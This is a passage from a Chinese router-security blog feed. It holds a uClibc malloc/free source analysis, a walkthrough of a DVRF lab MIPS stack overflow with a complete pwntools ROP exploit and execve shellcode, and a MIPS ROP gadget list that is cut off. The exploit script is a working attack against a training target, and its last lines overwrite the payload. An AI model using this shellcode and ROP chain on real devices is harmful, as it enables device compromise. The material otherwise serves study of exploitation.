 |</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		\__________ fa-&gt;size __________/</div><div class="line">	  </div><div class="line">		   分配后：</div><div class="line">			 ___ 已分配 __	  __ 空闲空间 __   __ 空闲空间信息 __</div><div class="line">		/			  \ /			   \ /					\</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		|			   |				|	heap_free_area	 |</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		\____ size ___/ \__ fa-&gt;size __/</div><div class="line">	  </div><div class="line">		*/</div><div class="line"></div><div class="line">    fa-&gt;size = fa_size - size;</div><div class="line"></div><div class="line">  return size;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注释很清晰了。所以如果我们有一个堆溢出，我们就需要覆盖到下面空闲空间的 <code>heap_free_area</code> 中的 指针，才能实现 <code>uClibc</code> 中的 <code>unlink</code> 攻击（当然还要其他条件的配合）,另外我们也知道了在 <code>malloc</code> 的时候，找到合适的 <code>heap_free_area</code>  后，只需要修改 <code>heap_free_area</code> 的 size位就可以实现了分配，所以在 <code>malloc</code> 中是无法 触发类似 <code>unlink</code> 的攻击的。</p>
<p>下面进入 <code>free</code></p>
<h4 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h4><p>首先看 free 函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">free (void *mem)</div><div class="line">&#123;</div><div class="line">  free_to_heap (mem, &amp;__malloc_heap, &amp;__malloc_heap_lock);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>直接调用了 <code>free_to_heap</code> 函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">static void</div><div class="line">__free_to_heap (void *mem, struct heap_free_area **heap)</div><div class="line">&#123;</div><div class="line">  size_t size;</div><div class="line">  struct heap_free_area *fa;</div><div class="line">   /* 检查 mem 是否合法 */</div><div class="line">  if (unlikely (! mem))</div><div class="line">    return;</div><div class="line">/* 获取 mem 指向的 malloc 块的的实际大小和起始地址 */</div><div class="line">  size = MALLOC_SIZE (mem); //获取块的真实大小</div><div class="line">  mem = MALLOC_BASE (mem); //获取块的基地址</div><div class="line">  __heap_lock (heap_lock); //加锁</div><div class="line">  /* 把 mem 指向的空间放到 heap 中  */</div><div class="line">  fa = __heap_free (heap, mem, size);</div><div class="line"></div><div class="line"> //如果FA中的空闲区超过  MALLOC_UNMAP_THRESHOLD。就要进行内存回收了,涉及 brk, 看不懂，就不说了，感觉和利用也没啥关系。</div></pre></td></tr></table></figure>
<p>首先获得了 内存块的起始地址和大小，然后调用 <code>__heap_free</code> 把要 <code>free</code> 的内存放到 <code>heap</code> 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*</div><div class="line">语义上的理解是释放掉从mem开始的size大小的内存。换句话说，就是把从从mem开始的，size大小的内存段，映射回heap。</div><div class="line">*/</div><div class="line">struct heap_free_area *</div><div class="line">__heap_free (struct heap_free_area **heap, void *mem, size_t size)</div><div class="line">&#123;</div><div class="line">  struct heap_free_area *fa, *prev_fa;</div><div class="line">  </div><div class="line">  //拿到 mem的 结束地址</div><div class="line">  void *end = (char *)mem + size;</div><div class="line"></div><div class="line"></div><div class="line">  /* 空闲区域链表是按照地址从小到大排列的，这个循环是为了找到 mem 应该插入的位置 */</div><div class="line">  for (prev_fa = 0, fa = *heap; fa; prev_fa = fa, fa = fa-&gt;next)</div><div class="line">    if (unlikely (HEAP_FREE_AREA_END (fa) &gt;= mem))</div><div class="line">      break;</div><div class="line"></div><div class="line">  if (fa &amp;&amp; HEAP_FREE_AREA_START (fa) &lt;= end)</div><div class="line">   //这里是相邻的情况,不可能小于，所以进入这的就是 HEAP_FREE_AREA_START (fa) == end, 则 mem, 和 fa所表示的内存块相邻</div><div class="line">    &#123;</div><div class="line">    /* </div><div class="line">		如果 fa 和 mem 是连续的，那么将 mem 空间并入 fa 节点（增加fa的大小即可）管理, 如图所示，地址从左至右依次增大</div><div class="line">	</div><div class="line">		  +---------------+--------------+---------------+</div><div class="line">		  | 	  |prev_fa| 	 mem	 |fa_chunk| fa   |</div><div class="line">		  +---------------+--------------+---------------+</div><div class="line">						  ^______________________________^ </div><div class="line">	</div><div class="line">		prev_fa 与 fa 的链接关系不变，只要更改 fa 中的 size 就可以了</div><div class="line">	   */</div><div class="line"></div><div class="line">      size_t fa_size = fa-&gt;size + size;</div><div class="line">      if (HEAP_FREE_AREA_START (fa) == end)</div><div class="line">	&#123;</div><div class="line">	  if (prev_fa &amp;&amp; mem == HEAP_FREE_AREA_END (prev_fa))</div><div class="line">	    &#123;</div><div class="line"></div><div class="line">		 /* 如果 fa 前一个节点和 mem 是连续的，那么将 fa 前一个节点的空间</div><div class="line">			     也并入 fa 节点管理</div><div class="line"></div><div class="line">			   +---------------+---------------+--------------+---------------+</div><div class="line">			   |       |pre2_fa|       |prev_fa|      mem     |       |   fa  |</div><div class="line">			   +---------------+---------------+--------------+---------------+</div><div class="line">		                       ^______________________________________________^</div><div class="line"></div><div class="line">			    将 prev_fa 从链表中移出，同时修改 fa 中的 size</div><div class="line">          */</div><div class="line">	      fa_size += prev_fa-&gt;size;</div><div class="line">	      __heap_link_free_area_after (heap, fa, prev_fa-&gt;prev);</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">      else</div><div class="line">	&#123;</div><div class="line">	  struct heap_free_area *next_fa = fa-&gt;next;</div><div class="line"></div><div class="line">	   /* 如果 mem 与 next_fa 是连续的，将 mem 并入 next_fa 节点管理</div><div class="line"></div><div class="line"> 	   +---------------+--------------+--------------+---------------+</div><div class="line">	   |       |prev_fa|      |   fa  |      mem     |       |next_fa|</div><div class="line">	   +---------------+--------------+--------------+---------------+</div><div class="line">                       ^_____________________________________________^ </div><div class="line"></div><div class="line">	   将 fa 从链表中移出，同时修改 next_fa 中的 size</div><div class="line">	  */</div><div class="line">	  if (next_fa &amp;&amp; end == HEAP_FREE_AREA_START (next_fa))</div><div class="line">	    &#123;</div><div class="line">	      fa_size += next_fa-&gt;size;</div><div class="line">	      __heap_link_free_area_after (heap, next_fa, prev_fa);</div><div class="line">	      fa = next_fa;</div><div class="line">	    &#125;</div><div class="line">	  else</div><div class="line">	    /* FA can&apos;t be merged; move the descriptor for it to the tail-end</div><div class="line">	       of the memory block.  */</div><div class="line"></div><div class="line"></div><div class="line">	      /* 如果 mem 与 next_fa 不连续，将 fa 结点移到 mem 尾部</div><div class="line"></div><div class="line"> 	   +---------------+--------------+--------------+---------------+</div><div class="line">	   |       |prev_fa|      |   fa  | mem | unused |       |next_fa|</div><div class="line">	   +---------------+--------------+--------------+---------------+</div><div class="line">                          ^___________________^^________________________^</div><div class="line"></div><div class="line">	       需要重新链接 fa 与 prev_fa 和 next_fa 的关系</div><div class="line">            */</div><div class="line">	    &#123;</div><div class="line">	      /* The new descriptor is at the end of the extended block,</div><div class="line">		 SIZE bytes later than the old descriptor.  */</div><div class="line">	      fa = (struct heap_free_area *)((char *)fa + size);</div><div class="line">	      /* Update links with the neighbors in the list.  */</div><div class="line">	      __heap_link_free_area (heap, fa, prev_fa, next_fa);</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">      fa-&gt;size = fa_size;</div><div class="line">    &#125;</div><div class="line">  else</div><div class="line">     /* 如果fa和 mem之间有空隙或者 mem&gt; HEAP_FREE_AREA_END (fa)，那么可以简单地</div><div class="line">       把 mem 插入 prev_fa 和 fa之间 */</div><div class="line">    fa = __heap_add_free_area (heap, mem, size, prev_fa, fa);</div><div class="line"></div><div class="line">  return fa;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>__heap_link_free_area</code> 就是简单的链表操作。没有什么用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static __inline__ void</div><div class="line">__heap_link_free_area (struct heap_free_area **heap, struct heap_free_area *fa,</div><div class="line">		       struct heap_free_area *prev,</div><div class="line">		       struct heap_free_area *next)</div><div class="line">&#123;</div><div class="line">  fa-&gt;next = next;</div><div class="line">  fa-&gt;prev = prev;</div><div class="line"></div><div class="line">  if (prev)</div><div class="line">    prev-&gt;next = fa;</div><div class="line">  else</div><div class="line">    *heap = fa;</div><div class="line">  if (next)</div><div class="line">    next-&gt;prev = fa;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>感觉唯一可能的利用点在于,前后相邻的情况，需要先把 <code>prev_fa</code> 拆链表，我们如果可以伪造 <code>prev_fa-&gt;prev</code>，就可以得到一次内存写的机会，不过也只能写入 <code>fa</code> 的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fa_size += prev_fa-&gt;size;</div><div class="line">__heap_link_free_area_after (heap, fa, prev_fa-&gt;prev);</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static __inline__ void</div><div class="line">__heap_link_free_area_after (struct heap_free_area **heap,</div><div class="line">			     struct heap_free_area *fa,</div><div class="line">			     struct heap_free_area *prev)</div><div class="line">&#123;</div><div class="line">  if (prev)</div><div class="line">    prev-&gt;next = fa;</div><div class="line">  else</div><div class="line">    *heap = fa;</div><div class="line">  fa-&gt;prev = prev;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>怎么感觉没有可利用的点，还是太菜了。以后如果遇到实例一定要补充进来。</p>
<p>tips:</p>
<ul>
<li><p>分析库源码时看不太懂可以先编译出来，然后配合这 <code>ida</code> 看，所以要编译成 <code>x86</code> 或者 <code>arm</code> 方便 <code>f5</code> 对照看。比如这次，我把 <code>uClibc</code> 编译成 <code>arm</code> 版后，使用 <code>ida</code> 一看，发现 <code>uClibc</code> 怎么使用的是 <code>glibc</code> 的那一套，一看源码目录发现，原来它已经切换到 <code>glibc</code> 这了。</p>
</li>
<li><p>忽然想起来交叉编译环境感觉可以用 docker 部署，网上一搜发现一大把，瞬间爆炸。</p>
</li>
</ul>
<p>参考链接：</p>
<p><a href="http://blog.chinaunix.net/uid-20543183-id-1930765.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-20543183-id-1930765.html</a></p>
<p><a href="http://hily.me/blog/2007/06/uclibc-malloc-free/" target="_blank" rel="external">http://hily.me/blog/2007/06/uclibc-malloc-free/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> uclibc源码分析 </tag>
            
            <tag> malloc &amp;&amp; free </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之rop技术实战]]></title>
      <url>//%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-28-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8Brop%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次程序也是 DVRF 里面的，他的路径是 <code>pwnable/ShellCode_Required/stack_bof_02</code> , 同样是一个简单的栈溢出，不过这个程序里面没有提供 <code>getshell</code> 的函数，需要我们执行shellcode来实现。这个正好实战下前文: <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">一步一步pwn路由器之路由器环境修复&amp;&amp;rop技术分析</a>,中分析的在mips下的通用的rop技术。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先使用 <code>qemu</code> 运行目标程序，并等待 <code>gdb</code> 来调试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/ShellCode_Required/stack_bof_02  &quot;`cat ./pwnable/Intro/input`&quot;</div></pre></td></tr></table></figure></p>
<p>使用pwntools的 cyclic 功能，找到偏移<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15091628511130mev14fe.png?imageslim" alt="paste image"><br>验证一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = &quot;A&quot; * 508 + &apos;B&apos; * 4</div><div class="line"></div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509163815793mv4b39p0.png?imageslim" alt="paste image"><br>OK, 现在我们已经可以控制程序的 <code>$pc</code>寄存器了，下一步就是利用的方法了。使用前文的那个 rop 链，我们需要可以控制 <code>$s1</code>寄存器。但是这里我们并没有办法控制。不过在 <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-MIPS-rop-gadgets%E8%AE%B0%E5%BD%95%E8%B4%B4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html">这里</a>提到，在 <code>uclibc</code> 的 <code>scandir</code> 或者 <code>scandir64</code> 的函数末尾有一个<code>gadgets</code> 可以操控几乎所有寄存器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.text:0000AFE0                 lw      $ra, 0x40+var_4($sp)</div><div class="line">.text:0000AFE4                 lw      $fp, 0x40+var_8($sp)</div><div class="line">.text:0000AFE8                 lw      $s7, 0x40+var_C($sp)</div><div class="line">.text:0000AFEC                 lw      $s6, 0x40+var_10($sp)</div><div class="line">.text:0000AFF0                 lw      $s5, 0x40+var_14($sp)</div><div class="line">.text:0000AFF4                 lw      $s4, 0x40+var_18($sp)</div><div class="line">.text:0000AFF8                 lw      $s3, 0x40+var_1C($sp)</div><div class="line">.text:0000AFFC                 lw      $s2, 0x40+var_20($sp)</div><div class="line">.text:0000B000                 lw      $s1, 0x40+var_24($sp)</div><div class="line">.text:0000B004                 lw      $s0, 0x40+var_28($sp)</div><div class="line">.text:0000B008                 jr      $ra</div><div class="line">.text:0000B00C                 addiu   $sp, 0x40</div><div class="line">.text:0000B00C  # End of function scandir64</div></pre></td></tr></table></figure>
<p>于是利用的思路就很明确了。首先使用这段 <code>rop gadgets</code> 设置好寄存器，然后进入前文所说的 <code>rop</code> 链中执行。<br>最后的poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">from pwn import *</div><div class="line">context.endian = &quot;little&quot;</div><div class="line">context.arch = &quot;mips&quot;</div><div class="line"></div><div class="line">payload = &quot;&quot;</div><div class="line"></div><div class="line"># NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)</div><div class="line">for i in range(30):</div><div class="line">    payload += &quot;\x26\x40\x08\x01&quot;</div><div class="line"></div><div class="line"># execve shellcode translated from MIPS to MIPSEL</div><div class="line"># http://shell-storm.org/shellcode/files/shellcode-792.php</div><div class="line">payload += &quot;\xff\xff\x06\x28&quot;  # slti $a2, $zero, -1</div><div class="line">payload += &quot;\x62\x69\x0f\x3c&quot;  # lui $t7, 0x6962</div><div class="line">payload += &quot;\x2f\x2f\xef\x35&quot;  # ori $t7, $t7, 0x2f2f</div><div class="line">payload += &quot;\xf4\xff\xaf\xaf&quot;  # sw $t7, -0xc($sp)</div><div class="line">payload += &quot;\x73\x68\x0e\x3c&quot;  # lui $t6, 0x6873</div><div class="line">payload += &quot;\x6e\x2f\xce\x35&quot;  # ori $t6, $t6, 0x2f6e</div><div class="line">payload += &quot;\xf8\xff\xae\xaf&quot;  # sw $t6, -8($sp)</div><div class="line">payload += &quot;\xfc\xff\xa0\xaf&quot;  # sw $zero, -4($sp)</div><div class="line">payload += &quot;\xf4\xff\xa4\x27&quot;  # addiu $a0, $sp, -0xc</div><div class="line">payload += &quot;\xff\xff\x05\x28&quot;  # slti $a1, $zero, -1</div><div class="line">payload += &quot;\xab\x0f\x02\x24&quot;  # addiu;$v0, $zero, 0xfab</div><div class="line">payload += &quot;\x0c\x01\x01\x01&quot;  # syscall 0x40404</div><div class="line">shellcode = payload</div><div class="line"></div><div class="line"></div><div class="line">padding = &quot;O&quot; * 508</div><div class="line">payload = padding</div><div class="line">payload += p32(0x766effe0)</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += &apos;A&apos; * 4  # $s0</div><div class="line">payload += p32(0x7670303c)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += &apos;A&apos; * 4  # $s3</div><div class="line">payload += &apos;A&apos; * 4  # $s4</div><div class="line">payload += &apos;A&apos; * 4  # $s5</div><div class="line">payload += &apos;A&apos; * 4  # $s6</div><div class="line">payload += &apos;A&apos; * 4  # $s7</div><div class="line">payload += &apos;A&apos; * 4  # $fp</div><div class="line">payload += p32(0x76714b10)  # $ra for jmp</div><div class="line"></div><div class="line"># stack for gadget 2</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += &apos;A&apos; * 4  # $s0</div><div class="line">payload += p32(0x0002F2B0 + 0x766e5000)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += p32(0x766fbdd0)  # $ra</div><div class="line"></div><div class="line"></div><div class="line"># stack for gadget 2 for second</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += p32(0x767064a0)  # $s0  for jmp stack</div><div class="line">payload += p32(0x0002F2B0 + 0x766e5000)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += p32(0x766fbdd0)  # $ra for get stack addr</div><div class="line"></div><div class="line"># stack for shellcode</div><div class="line">payload += shellcode</div><div class="line"></div><div class="line">payload = &quot;A&quot; * 508 + &apos;B&apos; * 4</div><div class="line"></div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div><div class="line"></div><div class="line"></div><div class="line"># base 0x766e5000</div></pre></td></tr></table></figure></p>
<p>可以执行完毕 <code>shellcode</code> , 不过执行完后就异常了。神奇。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在调试rop时可以先在调试器中修改寄存器，内存数据来模拟实现，然后在写到脚本里面。</p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MIPS rop gadgets记录贴&&持续更新]]></title>
      <url>//%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-MIPS-rop-gadgets%E8%AE%B0%E5%BD%95%E8%B4%B4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本帖记录一些常用的,效果好的 rop gadgets.</p>
<p><strong>uClibc</strong></p>
<p><strong>从栈中设置<code>$t9</code> 并跳到 <code>$t9</code> 的gadgets , <code>__thread_start</code> 函数第二行</strong></p>
<p>使用 <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98.html">案例</a></p>
<p>使用tips:</p>
<ul>
<li>调用函数时，进入函数内部时要求 <code>$t9</code> 指向函数的起始地址。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lw      $t9, arg_0($sp)</div><div class="line">jalr    $t9</div></pre></td></tr></table></figure>
<p><strong>四个组合使用，调用栈中 shellcode 的 rop_gadget , 需要可以控制 <code>$s1</code>,</strong></p>
<p>详细分析在<a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">这里
</a></p>
<p>rop_gadget 1, <strong>设置 参数一 为 1</strong>，位于 <code>__uClibc_main</code> ,可以使用 <code>mipsrop.find(&quot;li $a0, 1&quot;)</code> 查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LOAD:00055C60                 li      $a0, 1</div><div class="line">LOAD:00055C64                 move    $t9, $s1</div><div class="line">LOAD:00055C68                 jalr    $t9 ; sub_55960</div><div class="line">LOAD:00055C5C                 lui     $s0, 2</div></pre></td></tr></table></figure></p>
<p>rop_gadget 2，<strong>从栈中设置寄存器</strong>，使用 <code>mipsrop.tail()</code> 查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">LOAD:0001E20C                 move    $t9, $s1</div><div class="line">LOAD:0001E210                 lw      $ra, 0x28+var_4($sp)</div><div class="line">LOAD:0001E214                 lw      $s2, 0x28+var_8($sp)</div><div class="line">LOAD:0001E218                 lw      $s1, 0x28+var_C($sp)</div><div class="line">LOAD:0001E21C                 lw      $s0, 0x28+var_10($sp)</div><div class="line">LOAD:0001E220                 jr      $t9</div><div class="line">LOAD:0001E224                 addiu   $sp, 0x28</div></pre></td></tr></table></figure></p>
<p>rop_gadget 3，<strong>获取栈地址</strong>，使用 <code>mipsrop.stackfinder()</code> 查找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">LOAD:000164C0                 addiu   $s2, $sp, 0x198+var_180</div><div class="line">LOAD:000164C4                 move    $a2, $v1</div><div class="line">LOAD:000164C8                 move    $t9, $s0</div><div class="line">LOAD:000164CC                 jalr    $t9 ; mempcpy</div><div class="line">LOAD:000164D0                 move    $a0, $s2</div></pre></td></tr></table></figure>
<p>rop_gadget 4，<strong>通过 <code>$t9</code>, 跳转到 <code>$s2</code></strong>，使用 <code>mipsrop.find(&quot;move    $t9, $s2&quot;)</code> 查找, 位于 <code>readdir</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LOAD:000118A4                 move    $t9, $s2</div><div class="line">LOAD:000118A8                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p><strong>从栈中取数据到寄存器, <code>opendir</code>  函数尾部</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:0000AA6C                 lw      $ra, 0xC0+var_4($sp)</div><div class="line">.text:0000AA70                 lw      $s2, 0xC0+var_8($sp)</div><div class="line">.text:0000AA74                 lw      $s1, 0xC0+var_C($sp)</div><div class="line">.text:0000AA78                 lw      $s0, 0xC0+var_10($sp)</div><div class="line">.text:0000AA7C                 jr      $ra</div><div class="line">.text:0000AA80                 addiu   $sp, 0xC0</div><div class="line">.text:0000AA80  # End of function opendir</div></pre></td></tr></table></figure></p>
<p><strong>从栈中设置基本上所有的重要寄存器，位于 <code>scandir</code> 或者 <code>scandir64</code>尾部</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">LOAD:00011BB0                 lw      $ra, 0x40+var_4($sp)</div><div class="line">LOAD:00011BB4                 lw      $fp, 0x40+var_8($sp)</div><div class="line">LOAD:00011BB8                 lw      $s7, 0x40+var_C($sp)</div><div class="line">LOAD:00011BBC                 lw      $s6, 0x40+var_10($sp)</div><div class="line">LOAD:00011BC0                 lw      $s5, 0x40+var_14($sp)</div><div class="line">LOAD:00011BC4                 lw      $s4, 0x40+var_18($sp)</div><div class="line">LOAD:00011BC8                 lw      $s3, 0x40+var_1C($sp)</div><div class="line">LOAD:00011BCC                 lw      $s2, 0x40+var_20($sp)</div><div class="line">LOAD:00011BD0                 lw      $s1, 0x40+var_24($sp)</div><div class="line">LOAD:00011BD4                 lw      $s0, 